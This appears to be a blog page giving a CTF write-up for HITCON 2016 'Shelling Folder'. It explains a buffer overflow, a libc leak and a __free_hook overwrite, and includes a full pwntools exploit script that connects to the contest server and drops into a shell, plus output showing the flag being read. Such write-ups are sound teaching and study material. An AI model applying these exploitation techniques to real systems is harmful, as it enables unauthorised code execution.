@@ -1,0 +1,745 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HITCON CTF 2016 Quals – Shelling Folder - Hacking Tube 2.0</title>
+<meta name="description" content="Category: pwnPoints: 200">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="HITCON CTF 2016 Quals – Shelling Folder">
+<meta property="og:url" content="http://0.0.0.0:4000/hitcon-ctf-2016-quals-shelling-folder/">
+
+
+  <meta property="og:description" content="Category: pwnPoints: 200">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2016-10-11T00:11:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/hitcon-ctf-2016-quals-shelling-folder/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HITCON CTF 2016 Quals – Shelling Folder">
+    <meta itemprop="description" content="Category: pwnPoints: 200">
+    <meta itemprop="datePublished" content="October 11, 2016">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HITCON CTF 2016 Quals – Shelling Folder
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> pwn
+<strong>Points:</strong> 200</p>
+
+<!-- more -->
+
+<p>64 bit ELF, with all the protection enabled.</p>
+
+<p>The program is a simple file system. You can create or delete files and folders, list files in a folder, change the current folder and calculate the size of a folder.</p>
+
+<p>It’s a unix-like file system, where folders are also a special type of file. Both folders and files are stored in the program with the following data structure:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">file</span><span class="p">{</span>
+    <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">sub_file</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span> <span class="c1">// will all be null if it's a normal file
+</span>    <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">parent_folder</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="kt">long</span> <span class="n">file_size</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">is_dir</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>If a folder is created, the <code class="highlighter-rouge">is_dir</code> flag will be set to <code class="highlighter-rouge">1</code>, and the <code class="highlighter-rouge">file_size</code> will be set to <code class="highlighter-rouge">0</code>. A folder is allowed to contain at most 10 <code class="highlighter-rouge">sub_file</code>. If a normal file is created ( not folder ), the <code class="highlighter-rouge">is_dir</code> flag will be set to <code class="highlighter-rouge">0</code>, and the value of <code class="highlighter-rouge">file_size</code> is set by user.</p>
+
+<p>There’s a <strong>buffer overflow vulnerability</strong> in the function of calculating the folder size:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">cal_folder_size</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">cur_folder</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+10h] [bp-30h]@3
+</span>    <span class="n">__int64</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+28h] [bp-18h]@5
+</span>    <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [sp+30h] [bp-10h]@3
+</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">cur_folder</span> <span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">);</span>
+
+    <span class="k">while</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&lt;=</span> <span class="mi">9</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">sub_file</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">v3</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">file_size</span><span class="p">;</span>
+            <span class="n">copy_file_name</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">sub_file</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span> <span class="c1">// &lt;-- here we have a buffer overflow vulnerability
+</span>            <span class="k">if</span> <span class="p">(</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">sub_file</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">is_dir</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+            <span class="p">{</span>
+                <span class="o">*</span><span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">else</span>
+            <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"%s : size %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">sub_file</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">file_size</span><span class="p">);</span>
+                <span class="o">*</span><span class="n">v3</span> <span class="o">+=</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">sub_file</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">file_size</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="o">++</span><span class="n">idx</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"The size of the folder is %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">file_size</span><span class="p">);</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+<p>When we set a file’s name, we can input at most 31 characters. Inside the <code class="highlighter-rouge">cal_folder_size</code> function, the program will try to copy the file’s name into a buffer <code class="highlighter-rouge">s</code>, which its size is only 24 bytes long. The vulnerability will cause the program to overwrite the <code class="highlighter-rouge">v3</code> variable.</p>
+
+<p>The <code class="highlighter-rouge">v3</code> variable is an <code class="highlighter-rouge">int*</code> type pointer, which points to the current folder’s <code class="highlighter-rouge">file_size</code>. Since we can overwrite this pointer, we can try to control this pointer and the size of the <code class="highlighter-rouge">sub_file[idx]</code>, so when the program execute the code at line:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">v3</span> <span class="o">+=</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">sub_file</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">file_size</span>
+</code></pre></div></div>
+<p><strong>it will actually let us control the value of any address.</strong></p>
+
+<p>But remember the program has all the protection enabled, including <strong>PIE</strong>, so first we’ll have to leak some address. Here’s how I leak the address of the libc:</p>
+
+<ol>
+  <li>Create &amp; delete some folders, so the pointer that points to the head of smallbin will appear on the heap memory.</li>
+  <li>Exploit the buffer overflow vulnerability, partial overwrite the <code class="highlighter-rouge">v3</code> pointer and make it point to a <code class="highlighter-rouge">struct file</code> pointer <code class="highlighter-rouge">p</code> ( <code class="highlighter-rouge">*v3 = p</code>).</li>
+  <li>Control a <code class="highlighter-rouge">sub_file</code>’s <code class="highlighter-rouge">file_size</code>, so when it comes to the line <code class="highlighter-rouge">*v3 += cur_folder-&gt;sub_file[idx]-&gt;file_size</code>, it will adjust the value of <code class="highlighter-rouge">p</code>, making <code class="highlighter-rouge">p-&gt;name</code> point to the libc’s address ( address of the smallbin’s head )</li>
+  <li>List the files in the current folder and leak the libc’s address.</li>
+</ol>
+
+<p>After we got the libc’s address, we can use the same vulnerability to overwrite the <code class="highlighter-rouge">__free_hook</code> function pointer into the address of <strong>one gadget</strong>, and get the shell by deleting a file. Notice that <code class="highlighter-rouge">file_size</code> stores the value returned by <code class="highlighter-rouge">atoi</code>, a four-byte integer, so we’ll have to overwrite <code class="highlighter-rouge">__free_hook</code> twice : first  overwrite <code class="highlighter-rouge">__free_hook</code>,  then overwrite <code class="highlighter-rouge">__free_hook+4</code>.</p>
+
+<p>```python exp_shell.py
+#!/usr/bin/env python</p>
+
+<p>from pwn import *
+import subprocess
+import sys
+import time</p>
+
+<p>HOST = “52.69.237.212”
+#HOST = “127.0.0.1”
+PORT = 4869
+ELF_PATH = “./shellingfolder_noalarm”
+#LIBC_PATH = “/lib/x86_64-linux-gnu/libc.so.6”
+LIBC_PATH = “./libc.so.6”</p>
+
+<h1 id="setting">setting</h1>
+<p>context.arch = ‘amd64’
+context.os = ‘linux’
+context.endian = ‘little’
+context.word_size = 32</p>
+<h1 id="critical-debug-error-info-notset-warn-warning">[‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]</h1>
+<p>context.log_level = ‘INFO’</p>
+
+<p>elf = ELF(ELF_PATH)
+libc = ELF(LIBC_PATH)</p>
+
+<p>def my_recvuntil(s, delim):
+    res = “”
+    while delim not in res:
+        c = s.recv(1)
+        res += c
+        sys.stdout.write(c)
+        sys.stdout.flush()
+    return res</p>
+
+<p>def myexec(cmd):
+    return subprocess.check_output(cmd, shell=True)</p>
+
+<p>def str_addr(s, f): # search string address in file
+    result = list(f.search(s+”\x00”))
+    if not len(result): # no result
+        return None
+    else:
+        return result[0]</p>
+
+<p>def create_file(name, size):
+    r.sendlineafter(“:”, “4”)
+    r.sendafter(“:”, name)
+    r.sendlineafter(“:”, str(size))</p>
+
+<p>def change_dir(name):
+    r.sendlineafter(“:”, “2”)
+    r.sendafter(“:”, name)</p>
+
+<p>def remove(name):
+    r.sendlineafter(“:”, “5”)
+    r.sendafter(“:”, name)</p>
+
+<p>def make_dir(name):
+    r.sendlineafter(“:”, “3”)
+    r.sendafter(“:”, name)</p>
+
+<p>def ls():
+    r.sendlineafter(“:”, “1”)</p>
+
+<p>def cal():
+    r.sendlineafter(“:”, “6”)</p>
+
+<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
+#r = process(ELF_PATH)
+
+# overwrite &amp;file-&gt;fize_size (address of file_size)
+# use cal() to let file-&gt;name point to main_arena+88
+make_dir("AAAA")
+make_dir("BBBB")
+make_dir("CCCC")
+create_file("F"*24+p8(0x10), 64)
+remove("BBBB\n")
+remove("CCCC\n")
+cal()
+ls()
+
+# leak libc address
+######################## one gadget
+# .text:000000000004525A                 mov     rax, cs:environ_ptr_0
+# .text:0000000000045261                 lea     rdi, aBinSh     ; "/bin/sh"
+# .text:0000000000045268                 lea     rsi, [rsp+188h+var_158]
+# .text:000000000004526D                 mov     cs:dword_3C54A0, 0
+# .text:0000000000045277                 mov     cs:dword_3C54A4, 0
+# .text:0000000000045281                 mov     rdx, [rax]
+# .text:0000000000045284                 call    execve
+##########################
+r.recvuntil("----------------------\n")
+libc.address += u64(r.recv(6).ljust(8, "\x00")) - 0x3c3b78
+one_gadget = libc.address + 0x4525a
+malloc_hook = libc.symbols['__malloc_hook']
+free_hook = libc.symbols['__free_hook']
+log.success("libc_base: "+hex(libc.address))
+log.success("one_gadget: "+hex(one_gadget))
+log.success("malloc_hook: "+hex(malloc_hook))
+log.success("free_hook: "+hex(free_hook))
+
+# overwrite free_hook to one_gadet
+make_dir("DDDD")
+change_dir("DDDD\n")
+create_file("i"*24+p64(free_hook)[:7:], (one_gadget &amp; 0xffffffff))
+create_file("I"*24+p64(free_hook+4)[:7:], ((one_gadget &amp; 0xffffffff00000000)&gt;&gt;32))
+cal()
+# get shell
+remove("i"*24+p64(free_hook)[:7:])
+
+r.interactive() ```
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[x] Opening connection to 52.69.237.212 on port 4869
+[x] Opening connection to 52.69.237.212 on port 4869: Trying 52.69.237.212
+[+] Opening connection to 52.69.237.212 on port 4869: Done
+[+] libc_base: 0x7ff15c7cc000
+[+] one_gadget: 0x7ff15c81125a
+[+] malloc_hook: 0x7ff15cb8fb10
+[+] free_hook: 0x7ff15cb917a8
+[*] Switching to interactive mode
+ size 32753
+The size of the folder is 0
+**************************************
+            ShellingFolder            
+**************************************
+ 1.List the current folder            
+ 2.Change the current folder          
+ 3.Make a folder                      
+ 4.Create a file in current folder    
+ 5.Remove a folder or a file          
+ 6.Caculate the size of folder        
+ 7.Exit                               
+**************************************
+Your choice:Choose a Folder or file :
+
+// id
+uid=1000(shellingfolder) gid=1000(shellingfolder) groups=1000(shellingfolder)
+
+// cat /home/shellingfolder/flag
+hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}
+</code></pre></div></div>
+
+<p>flag: <code class="highlighter-rouge">hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}</code></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#bof" class="page__taxonomy-item" rel="tag">BOF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#heap" class="page__taxonomy-item" rel="tag">heap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#hitcon" class="page__taxonomy-item" rel="tag">HITCON</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2016-10-11T00:11:00+08:00">October 11, 2016</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=HITCON+CTF+2016+Quals+--+Shelling+Folder%20http%3A%2F%2F0.0.0.0%3A4000%2Fhitcon-ctf-2016-quals-shelling-folder%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fhitcon-ctf-2016-quals-shelling-folder%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fhitcon-ctf-2016-quals-shelling-folder%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/hitcon-ctf-2016-quals-hackpad/" class="pagination--pager" title="HITCON CTF 2016 Quals – Hackpad
+">Previous</a>
+    
+    
+      <a href="/seccon-ctf-2016-checker/" class="pagination--pager" title="SECCON CTF 2016 – checker
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/hitcon-ctf-2016-quals-shelling-folder/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/hitcon-ctf-2016-quals-shelling-folder"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
